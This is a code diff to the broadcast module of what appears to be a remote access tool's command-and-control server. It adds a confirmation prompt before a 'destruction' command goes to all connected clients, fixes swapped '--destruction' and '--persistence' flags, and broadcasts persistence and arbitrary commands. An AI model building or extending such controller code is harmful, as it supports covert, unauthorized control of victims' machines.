@@ -2,6 +2,7 @@ from .handler import Handler
 
 from .other import printColor
 from .other import XOREncryption
+from .other import areYouSure
 from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT
 
 from .management import CheckConn
@@ -50,18 +51,22 @@ class Broadcast:
         self.broadcast_to_all_clients(cmd) #send command for all client
 
     def destruction_for_all_clients(self):
-        
-        request = "MOD_DESTRUCTION:broadcast"
-        for key in Handler.dict_conn.keys():
-            if(Handler.dict_conn[key][NB_ALIVE]):
-                if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
-                    printColor("information","[-] (in broadcast lol) Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
-                    CheckConn().connexionIsDead(key) 
+        printColor("information","\n[!] are you sure you want to run the destruction mode on all customers ? Once the destruction mode is activated, the clients will no longer be accessible.\nIf you are sure of your choice enter Y if not enter N.\n")
+        if(areYouSure()):
+            request = "MOD_DESTRUCTION:broadcast"
+            print("\n")
+            for key in Handler.dict_conn.keys():
+                if(Handler.dict_conn[key][NB_ALIVE]):
+                    if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
+                        printColor("information","[-] Client number {} {}:{} was disconnected.".format(Handler.dict_conn[key][NB_SESSION], Handler.dict_conn[key][NB_IP], Handler.dict_conn[key][NB_PORT]))
+                        CheckConn().connexionIsDead(key) 
 
+                    else:
+                        printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                 else:
-                    printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
-            else:
-                pass
+                    pass
+        else:
+            pass
 
     def disconnection_for_all_clients(self):
         pass
@@ -115,10 +120,10 @@ class Broadcast:
                             self.help()
                         
                         elif(forall[i] == "--destruction"):
-                            self.broadcast_to_all_clients("MOD_DESTRUCTION:broadcast",True)
+                            self.destruction_for_all_clients()
                         
                         elif(forall[i] == "--persistence"):
-                            self.destruction_for_all_clients()
+                            self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
                         
                         elif(forall[i] == "-c"):
                             self.executeCommand(forall)
